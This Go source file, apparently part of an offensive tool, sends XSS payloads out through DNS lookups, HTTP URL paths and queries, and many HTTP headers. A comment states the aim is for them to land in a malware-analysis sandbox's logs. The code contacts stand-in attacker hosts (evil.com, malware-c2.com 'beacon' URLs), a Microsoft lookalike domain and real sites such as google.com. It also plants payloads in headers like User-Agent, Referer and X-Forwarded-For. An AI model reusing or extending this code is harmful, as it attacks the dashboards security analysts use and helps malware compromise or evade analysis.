package xss

import (
	"fmt"
	"net"
	"net/http"
	"net/url"
	"time"
)

// injectIntoDNS hace consultas DNS con payloads XSS en el nombre de dominio
func injectIntoDNS(payload XSSPayload) {
	// Construir dominio con payload (sanitizado para DNS)
	// Nota: Los caracteres especiales pueden causar que falle, pero eso está bien
	// El objetivo es que aparezca en los logs de la sandbox

	domains := []string{
		// Dominio con ID del payload
		fmt.Sprintf("xss-%s.callback.test", payload.ID[:8]),
		// Dominio con contenido (primeros caracteres)
		fmt.Sprintf("malware-%s.evil.com", payload.ID[:8]),
		// Dominio que parece legítimo pero tiene el callback
		fmt.Sprintf("update-%s.microsoft-check.com", payload.ID[:8]),
	}

	for _, domain := range domains {
		// Intentar resolver (no importa si falla)
		net.LookupHost(domain)
	}
}

// injectIntoHTTP hace requests HTTP con payloads XSS en la URL
func injectIntoHTTP(payload XSSPayload) {
	// Construir URLs con XSS
	// Usamos url.QueryEscape para el payload completo en la query
	encodedPayload := url.QueryEscape(payload.Content)

	urls := []string{
		// URL con payload en el path
		fmt.Sprintf("http://evil.com/api/%s", payload.ID[:8]),
		// URL con payload en query param
		fmt.Sprintf("http://malware-c2.com/beacon?id=%s&data=%s", payload.ID[:8], payload.ID[8:16]),
		// URL que parece CDN
		fmt.Sprintf("http://cdn.updates.com/check/%s", payload.ID[:8]),
		// [NUEVO] URL con payload JS completo en query (Brute)
		fmt.Sprintf("http://vulnerable-site.com/search?q=%s", encodedPayload),
		// [NUEVO] URL con payload JS en path (Brute)
		fmt.Sprintf("http://cdn.test.com/%s/image.png", encodedPayload),
	}

	// Cliente HTTP con timeout muy corto
	client := &http.Client{
		Timeout: 2 * time.Second,
		// No seguir redirects
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	for _, url := range urls {
		// Intentar hacer request (no importa si falla)
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			continue
		}

		// Agregar User-Agent con payload
		req.Header.Set("User-Agent", fmt.Sprintf("MalwareBot/%s", payload.ID[:8]))

		// Hacer request
		client.Do(req)
	}
}

// injectIntoUserAgent crea requests con User-Agent malicioso
func injectIntoUserAgent(payload XSSPayload) {
	// URL ficticia
	url := "http://example.com/check"

	client := &http.Client{Timeout: 2 * time.Second}
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return
	}

	// User-Agent con XSS
	req.Header.Set("User-Agent", payload.Content)

	// Intentar request
	client.Do(req)
}

// injectIntoHeaders inyecta el payload en múltiples cabeceras HTTP
func injectIntoHeaders(payload XSSPayload) {
	targetURL := "http://google.com" // URL inocua, lo importante son las cabeceras salientes

	client := &http.Client{
		Timeout: 2 * time.Second,
	}

	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return
	}

	// Lista de cabeceras donde inyectar el payload JS completo
	headers := []string{
		"User-Agent",
		"Referer",
		"X-Forwarded-For",
		"X-Client-IP",
		"X-Remote-IP",
		"X-Originating-IP",
		"From",
		"Client-IP",
		"Contact",
		"X-Wap-Profile",
		"X-Api-Version",
	}

	for _, h := range headers {
		req.Header.Set(h, payload.Content)
	}

	client.Do(req)
}
